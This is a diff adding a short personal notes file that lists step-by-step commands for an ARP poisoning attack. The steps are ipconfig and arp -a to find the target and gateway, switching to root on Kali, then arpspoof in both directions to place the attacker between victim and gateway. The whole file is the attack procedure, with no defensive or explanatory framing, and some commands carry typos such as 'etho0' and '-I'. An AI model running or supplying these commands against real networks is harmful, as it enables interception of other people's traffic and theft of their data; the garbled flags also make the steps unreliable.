@@ -1,0 +1,13 @@
+arp poisoning
+
+
+1.ipconfig
+2.copy the ip address from ipv4
+3.arp -a
+4.copy the ip address and gateway just below it 
+5. Go to kali 
+6. sudo su give pswd 
+7. arpspoof -i etho0 -t ip gw
+8.ulta
+that is 
+arpspoof -I eth0 -t gw ip
